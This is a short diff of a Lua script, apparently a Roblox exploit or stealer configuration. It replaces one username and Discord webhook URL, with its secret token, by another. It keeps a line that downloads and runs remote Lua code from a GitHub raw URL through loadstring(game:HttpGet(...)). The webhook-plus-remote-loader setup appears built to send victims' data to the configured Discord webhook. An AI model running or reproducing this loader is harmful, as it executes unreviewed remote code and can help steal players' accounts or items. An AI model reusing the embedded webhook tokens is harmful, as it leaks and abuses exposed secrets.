@@ -1,3 +1,3 @@
-UserName = "SEBI_K4"
-Webhook = "https://discord.com/api/webhooks/1085283329319907409/qqIExJ_AvLIS_ThxvLJE6fnU-JJJYpfMgPAFINMf8La74FJhTfl8LXjBfao1H6TtTYjk"
+UserName = "Martaliya_robloxx"
+Webhook = "https://discord.com/api/webhooks/1084546452593856552/atOT-HTl1akwCSHjDJibSed8ocn1eMg7_3O-Wq0YjMlNUbK4CpduGnKAMIs9GFjgJbvT"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
